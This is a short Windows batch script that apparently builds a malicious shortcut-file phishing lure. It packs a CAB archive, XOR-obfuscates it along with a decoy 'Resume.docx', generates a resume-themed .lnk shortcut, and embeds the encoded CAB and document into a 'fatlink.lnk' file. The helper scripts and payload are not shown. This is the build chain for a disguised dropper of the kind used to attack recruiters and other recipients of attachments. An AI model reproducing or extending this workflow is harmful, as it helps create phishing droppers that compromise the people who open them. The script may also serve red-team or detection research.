echo "generate a cab file"
call createcab.bat

echo "created a xored doc and cab file"
python xored.py -f Resume.docx -k 51
python xored.py -f 1.cab -k 88

echo "generate resume.lnk file"
python clink.py

echo "generate fatlink.lnk embedding xored cab and docx"
python embed_lnk.py

rem mkdir test_output_link
rem copy fatlnk.lnk-1 .\test_output_link\fatlink.lnk-1
